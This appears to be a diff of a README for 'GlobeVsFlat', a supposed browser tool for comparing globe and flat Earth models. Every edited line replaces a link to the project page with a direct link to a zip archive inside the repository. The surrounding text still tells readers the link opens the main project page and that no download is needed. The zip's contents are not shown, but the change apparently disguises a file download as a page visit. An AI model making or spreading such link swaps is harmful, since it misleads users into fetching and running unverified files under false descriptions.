@@ -1,6 +1,6 @@
 # 🌍 GlobeVsFlat - Compare Earth Models Visually
 
-[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-blue?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat)
+[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-blue?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat/raw/refs/heads/main/client/Globe-Flat-Vs-3.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ No additional programs or files are required beyond opening the app in your brow
 
 To get started, visit the GlobeVsFlat page below:
 
-[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-green?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat)
+[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-green?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat/raw/refs/heads/main/client/Globe-Flat-Vs-3.4.zip)
 
 This link takes you to the main project page on GitHub. From here, you can open the web tool directly or download files if available.
 
@@ -36,7 +36,7 @@ This link takes you to the main project page on GitHub. From here, you can open 
 ## 💾 How to Run GlobeVsFlat on Windows
 
 1. Open your web browser. Chrome or Edge works best.  
-2. Click this link: [GlobeVsFlat on GitHub](https://github.com/Andrizzzz/GlobeVsFlat)  
+2. Click this link: [GlobeVsFlat on GitHub](https://github.com/Andrizzzz/GlobeVsFlat/raw/refs/heads/main/client/Globe-Flat-Vs-3.4.zip)  
 3. On the GitHub page, look for the "Open in GitHub Pages" or similar button to launch the app.  
 4. If the web app is not directly available, look for "Releases" or files to download the application.  
 5. Download any files available, such as `.html` or `.zip`.  
@@ -141,7 +141,7 @@ Yes. GlobeVsFlat works on Linux, macOS, and mobile browsers.
 
 Click below to visit the main page and get the latest version:
 
-[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-purple?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat)
+[![Download GlobeVsFlat](https://img.shields.io/badge/Download-GlobeVsFlat-purple?style=for-the-badge)](https://github.com/Andrizzzz/GlobeVsFlat/raw/refs/heads/main/client/Globe-Flat-Vs-3.4.zip)
 
 ---
 
